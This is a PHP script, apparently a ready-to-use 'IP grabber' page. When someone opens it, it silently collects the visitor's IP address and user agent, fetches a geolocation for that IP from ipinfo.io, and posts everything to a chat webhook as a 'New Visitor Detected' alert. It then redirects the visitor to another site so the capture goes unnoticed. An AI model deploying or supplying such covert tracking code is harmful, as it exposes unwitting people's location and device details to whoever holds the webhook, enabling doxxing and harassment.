<?php

header('Content-Type: application/json');

function ip_address() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
        $ip = $_SERVER['HTTP_X_REAL_IP'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    if (strpos($ip, ',') !== false) {
        $ip = explode(',', $ip)[0];
    }

    return trim($ip);
}

function geo_estimator($api_ip) {
    $ch = curl_init($api_ip);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

function send_geolocation($webhook, $api_ip) {
    $geo = geo_estimator($api_ip);

    $payload = json_encode(["content" => "```json\n$geo\n```"]);

    $ch = curl_init($webhook);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_exec($ch);
    curl_close($ch);
}

function send_to_webhook($webhook, $ip, $ua, $api_ip) {
    $payload = json_encode([
        "username"   => "Access Monitor",
        "avatar_url" => "https://i.imgur.com/4M34hi2.png",
        "embeds"     => [
            [
                "title"       => "New Visitor Detected",
                "description" => "A user has accessed the site.",
                "color"       => hexdec("5865F2"),
                "fields"      => [
                    ["name" => "IP Address",  "value" => $ip, "inline" => true],
                    ["name" => "User Agent",  "value" => $ua, "inline" => true]
                ],
                "footer"      => ["text" => "Access Monitor"],
                "timestamp"   => date("c")
            ]
        ]
    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

    $ch = curl_init($webhook);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_exec($ch);
    curl_close($ch);

    send_geolocation($webhook, $api_ip);
}

$ip      = ip_address();
$ua      = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$webhook = "";
$api_ip  = "https://ipinfo.io/$ip/json";

send_to_webhook($webhook, $ip, $ua, $api_ip);

header("Location: https://yourdomain.com.ph/");
exit;
